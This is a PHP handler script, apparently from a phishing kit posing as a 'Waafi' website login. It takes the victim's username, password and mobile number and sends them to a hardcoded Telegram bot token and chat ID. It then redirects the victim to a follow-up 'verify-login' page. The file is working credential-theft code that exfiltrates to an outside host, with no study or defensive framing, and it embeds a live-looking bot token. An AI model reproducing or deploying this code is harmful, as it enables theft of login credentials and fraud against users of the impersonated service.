<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');
    $mobile   = trim($_POST['mobile'] ?? '');
    $package  = trim($_POST['package'] ?? '');

    if ($username === '' || $password === '' || $mobile === '') {
        die('All fields are required.');
    }

    $botToken = "8648558019:AAHImsUZ7UJK8t1b629JTTxSd3vvHpH0rhY";
    $chatId   = "8616678822";

    $text = "Waafi Website Message\n\n"
          . "mobile: $mobile\n"
          . "username: $username\n"
          . "password: $password";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text'    => $text
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if ($response === false) {
        header('Location: error.php');
        exit;
    }

    $result = json_decode($response, true);

    if (isset($result['ok']) && $result['ok'] === true) {
        header("Location: verify-login.php?mobile=" . urlencode($mobile) . "&package=" . urlencode($package));
        exit;
    }

    header('Location: verify-login.php');
    exit;
}
